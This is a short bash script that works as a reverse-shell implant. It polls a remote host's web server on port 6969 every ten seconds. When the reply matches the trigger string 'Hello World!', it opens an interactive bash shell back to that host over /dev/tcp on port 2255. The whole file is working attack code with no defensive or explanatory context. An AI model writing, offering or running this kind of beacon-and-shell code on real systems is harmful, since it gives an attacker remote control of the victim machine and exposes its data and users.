#!/bin/bash


IP=$1

REVERSE_SHELL_CODE="Hello World!"

while true; do
    echo  "http://$IP:6969"
    RESPONSE=$(curl -s http://$IP:6969)
    if [[ $RESPONSE == "" ]]; then
        echo "server down."
    else
        if [[ $RESPONSE == $REVERSE_SHELL_CODE ]]; then
            echo "STARTING REVERSE SHELL"
            bash -i >& /dev/tcp/$IP/2255 0>&1
        else
            echo $RESPONSE
            echo "something else"
        fi
    fi
    sleep 10 
done

